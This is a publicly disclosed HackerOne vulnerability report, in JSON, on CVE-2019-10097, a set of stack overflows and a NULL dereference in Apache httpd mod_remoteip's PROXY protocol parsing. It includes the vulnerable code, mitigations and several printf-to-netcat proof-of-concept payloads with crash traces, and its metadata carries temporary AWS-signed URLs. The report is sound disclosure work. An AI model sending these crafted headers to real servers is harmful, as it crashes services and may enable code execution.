{
  "id": 674540,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NzQ1NDA=",
  "url": "https://hackerone.com/reports/674540",
  "title": "mod_remoteip stack buffer overflow and NULL pointer dereference",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-08-15T14:42:13.816Z",
  "submitted_at": "2019-08-15T14:42:13.816Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ccppuu",
    "url": "/ccppuu",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132646Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=32de48fc9d06acbc3d138b1fb80065153b779c8563300620b0f0cc9f7db1dd0a",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132646Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=27210dae8bae5615295836adfb7380568d2824470f9a73b63d6879278339b39d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-10097"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-07T20:21:12.527Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-08T20:21:09.805Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Versions Affected:\nhttpd 2.4.32 to 2.4.39\n\nSummary:\nWhen mod_remoteip was configured to use a trusted intermediary proxy server using the \"PROXY\" protocol, a specially crafted PROXY v1 or PROXY v2 header could trigger a stack buffer overflow or NULL pointer deference. \n\nThis was assigned CVE-2019-10097 and triaged by the Apache security team as a \"Moderate\" severity vulnerability, fixed in Apache 2.4.41: https://www.openwall.com/lists/oss-security/2019/08/15/5\n\nThe HTTPD maintainers and I collaborated on the fix: http://svn.apache.org/viewvc?view=revision&revision=1864526\n\nOriginal report to Apache security team (with reproductions) follows:\n--------------------------------------------------------------------------------------------------------------------------------\n\nApache httpd 2.4.31+ and newer when configured with `mod_remoteip` and\n`RemoteIPProxyProtocol On` is affected by multiple vulnerabilities. The\nvulnerabilities can be triggered remotely with malicious PROXY protocol request\ninput (both PROXY protocol versions 1 and 2).\n\nThe vulnerabilities identified in this report:\n\n* HIGH: Stack overflow from unsafe memcpy handling PROXY v1/v2 messages\n* HIGH: Stack overflow from unsafe strcpy handling PROXY v1 messages\n* MED: Denial of service from null pointer dereference handling PROXY v2\n  messages\n\nThese vulnerabilities also apply to the 3rd party `mod_proxy_protocol` module\nfrom which the core HTTPD `mod_remoteip` module was derived.\n\n# Reported by\n\nDaniel McCarney - cpu@letsencrypt.org\nLet's Encrypt / Internet Security Research Group (ISRG)\n\n# Background\n\nIn a multi-tier architecture the server that terminates a client connection may\nin turn initiate a new request to another server. For access control and logging\nit's beneficial for the first server to be able to pass along information about\nthe original client request (e.g. source IP address and port) to the other\nserver(s).\n\nAs a replacement for ad-hoc HTTP headers (e.g. `X-Forwarded-For`) the HAProxy\nproject specified a protocol (confusingly) called PROXY[0]. There are two\nversions specified:\n\n* PROXY version 1 - a simple ASCII based protocol.\n* PROXY version 2 - a more efficient binary protocol.\n\nThe Apache HTTPD project added support to the core `mod_remoteip` module[1] for\nPROXY version 1 and version 2 in HTTPD version 2.4.31. It can be enabled\nserver-wide or per virtual host using the `RemoteIPProxyProtocol on`\nconfiguration. Previously Apache HTTPD servers could add support for the PROXY\nprotocol with a 3rd party `mod_proxy_protocol`[2] module.\n\n# Vulnerability Detail\n\nFunction names referenced in this section may be found in the source file\n`modules/metadata/mod_remoteip.c`[3].\n\nTo aid in reproduction I've created a simple Dockerfile available here:\n\n  https://gist.github.com/cpu/60365c1451bd531f79f5364f44f18f5c\n\nAnd modified a stock `httpd.conf` to enable PROXY protocol by adding:\n\n1. `RemoteIPProxyProtocol On`\n2. `LoadModule remoteip_module modules/mod_remoteip.so`\n\nThe `httpd.conf` is available here:\n\n  https://gist.github.com/cpu/a6b0edaacd9fdf8d978886d0a325d975\n\nAfter downloading both simply run:\n\n```\ndocker build -t test-apache2 .\ndocker run -dit --name test-apache2-app -p 6666:80 test-apache2\n```\n\nHTTPD logs are accessible with:\n\n```\ndocker logs -f test-apache2-app\n```\n\nThe provided proof of concept vulnerability triggers are now ready to be\ndelivered to `localhost:6666`.\n\n## Stack overflow from unsafe memcpy handling PROXY v1 and V2 messages\n\nIn the `remoteip_input_filter` function the data read from the bucket brigade\ncarrying the attacker input (pointed to by `ptr`, of len `len`) is copied into\nthe `ctx->header` structure, at an offset of `ctx->rcvd` bytes using `memcpy`:\n\n```\nmemcpy(ctx->header + ctx->rcvd, ptr, len);\n```\n\nThere is no enforcement that the destination buffer is sized appropriately so\nwhen `len` is larger than `sizeof(ctx->header)` a classic buffer overflow\noccurs.\n\n### Example reproduction\n\nAny PROXY v1 request with a \"PROXY \" prefix, a trailing `\\r\\n` and sufficient\nsize will trigger this vulnerability.\n\n```\nprintf \"PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17165)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b->p, b, brigade_cleanup);\n```\n\nAny valid PROXY v2 request (e.g. supported version, cmd, protocol and address family) and sufficient size will also trigger this vulnerability.\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x32\\x08\\x6f\\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17197)]\napr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52\n52          apr_pool_cleanup_kill(b->p, b, brigade_cleanup);\n```\n\n## Stack overflow from unsafe strcpy handling PROXY v1 messages\n\n### Detail\n\nAfter the `remoteip_input_filter` function has determined that received input is\nPROXY v1 (with `remoteip_determine_version`) the raw PROXY header data context\nis passed to `remoteip_process_v1_handler` to handle decoding the human readable\nPROXY v1 message format.\n\nA static sized buffer named `buf` is initialized on the stack with a capacity of\n`sizeof(hdr->v1.line)`, resulting in a 108 byte buffer. Later, a `strcpy` is\nused to copy from `hdr->v1.line` to `buf`. There is no check that the `strlen`\nof `hdr->v1.line` is less than the capacity of `buf`, resulting in a trivial\nbuffer overflow.\n\n```\n/* parse in separate buffer so have the original for error messages */\nstrcpy(buf, hdr->v1.line);\n```\n\n### Example reproduction\n\nAny PROXY v1 request with a \"PROXY \" prefix, a trailing `\\r\\n` and sufficient\nsize will trigger this vulnerabiltiy. Using requests that are too large will end\nup triggering the more general `memcpy` vulnerability discussed previously.\n\n```\nprintf \"PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\r\\n\" | nc localhost 6666\n```\n\nStacktrace:\n```\n*** buffer overflow detected ***: /usr/local/apache2/bin/httpd terminated\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff71927e5]\n/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff723415c]\n/lib/x86_64-linux-gnu/libc.so.6(+0x117160)[0x7ffff7232160]\n/lib/x86_64-linux-gnu/libc.so.6(+0x1164b2)[0x7ffff72314b2]\n/usr/local/apache2/modules/mod_remoteip.so(+0x39e3)[0x7ffff486e9e3]\n/usr/local/apache2/bin/httpd(ap_rgetline_core+0xfa)[0x43843a]\n/usr/local/apache2/bin/httpd(ap_read_request+0x2a6)[0x43b1e6]\n/usr/local/apache2/bin/httpd[0x464b6d]\n/usr/local/apache2/bin/httpd(ap_run_process_connection+0x40)[0x45beb0]\n/usr/local/apache2/bin/httpd[0x470455]\n/usr/local/apache2/bin/httpd[0x471428]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x76ba)[0x7ffff74ec6ba]\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7ffff722241d]\n```\n\n## Denial of service from null pointer dereference handling PROXY v2\n\nIn the `remoteip_input_filter` function it's assumed that when control flow\nreaches L1173 that the `done` variable is true and so the `conn_conf` has been\npopulated with the true `client_ip` and `client_addr` by the PROXY messages that\nwere processed to reach the done state. The `conn_conf->client_addr` field is\nthen dereferenced to log `conn_conf->client_addr->port`.\n\n```\nap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)\n              \"RemoteIPProxyProtocol: received valid PROXY header: %s:%hu\",\n              conn_conf->client_ip, conn_conf->client_addr->port);\n```\n\nUnfortunately there is a logic error in this assumption. The\n`remoteip_process_v2_header` function returns `HDR_DONE`, triggering `done = 1`\nin two conditions where the `conn_conf->client_addr` remains null, triggering\na null pointer dereference when `conn_conf->client_addr->port` is evaluated,\ncausing the worker thread to segfault.\n\nThe first condition this can occur is when the `hdr->v2.fam` indicating the\naddress family and protocol is unsupported:\n\n```\n    default:\n        /* unsupported protocol, keep local connection address */\n        return HDR_DONE;\n```\n\nThe other condition this can occur is when the `hdr->v2.ver_cmd`'s lower order\nbits are 0x00, indicating it is a LOCAL command.\n\n```\n   case 0x00: /* LOCAL command */\n       /* keep local connection address for LOCAL */\n       return HDR_DONE;\n```\n\nThe comments in the LOCAL command case potentially indicate that there was an\nassumption that the addresses were pre-populated and so HDR_DONE could be\nreturned without error. I believe this code/assumption were adopted from the\nHAProxy PROXY protocol example code at the end of the specification document[1]\nwhere the same `case 0x00` logic and comment can be found. In this example code\nhowever the `sockaddr_storage` for `from` and `to` are said to have been\n\"already filled by accept()\" and \"getsockname()\".\n\n### Example reproduction\n\nThis bug can be triggered with a valid PROXY v2 message using the LOCAL command:\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x20\\x11\\x00\\x00\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17395)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)\n\n```\n\nIt can also be triggered with a valid PROXY v2 message using the PROXY command\nand an unsupported address family/protocol:\n\n```\nprintf \"\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x00\\x00\\x00\" | nc localhost 6666\n```\n\nStack trace:\n```\nThread 3 \"httpd\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17437)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)\n```\n\n# Mitigations\n\nThe Apache `mod_remoteip` docs[1] strongly encourages care with what\nintermediate hosts should be trusted to provide `mod_remoteip` inputs:\n\n> It is critical to only enable this behavior from intermediate hosts (proxies,\n> etc) which are trusted by this server, since it is trivial for the remote\n> useragent to impersonate another useragent.\n\nAdministrators that restrict the hosts that can send requests to the\nVirtualHost/Server with `RemoteIPPRoxyProtocol on` (e.g. through external\nfirewall policy/network controls) will restrict their exposure\nto these vulnerabilities.\n\nUnfortunately unlike the `RemoteIPHeader` directives it is *not* possible to\nconfigure `RemoteIPProxyProtocol on` and whitelist intermediate IP addresses\n(e.g. like `RemoteIPInternalProxyList`) within the Apache configuration. Thus\nadministrators must take action above and beyond their Apache configuration to\nuse this module safely and mitigate the reported vulnerabilities.\n\n# Applicability to mod_proxy_protocol\n\nThe core Apache project `mod_remoteip` module's PROXY support was originally\nadopted from a 3rd party module, `mod_proxy_protocol`[2]. All of the\nvulnerabilities identified in this report are from code shared with the original\n`mod_proxy_protocol` module. Users of this module with other HTTPD versions are\nequally affected by these vulnerabilities.\n\n# References\n\n[0] https://httpd.apache.org/docs/2.4/mod/mod_remoteip.html\n[1] https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt\n[2] https://github.com/roadrunner2/mod-proxy-protocol\n[3] https://github.com/apache/httpd/blob/8cfc6007670cf4bcc7129c197dda456e0d5de102/modules/metadata/mod_remoteip.c\n\n## Impact\n\nThe classic stack overflows can lead to memory corruption and the potential for remote code execution.\n\nTypically the PROXY protocol is used between security contexts: e.g. a front-end web server in a DMZ terminates HTTP/HTTPS and uses the PROXY protocol when forwarding the request to an application server in a different security context with firewall rules protecting access except from the front-end web server. Abusing the PROXY protocol would allow an attacker who has compromised the front-end web server to pivot through code execution on the application server via crafted PROXY request.",
  "weakness": {
    "id": 3,
    "name": "Classic Buffer Overflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-07T20:21:09.895Z",
  "allow_singular_disclosure_after": -134672736.60999215,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "cryptographer",
    "armansameer",
    "bbbooomr",
    "canikfanatik",
    "acassimiro"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84129,
    "asset_type": "OTHER",
    "asset_identifier": "Apache (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
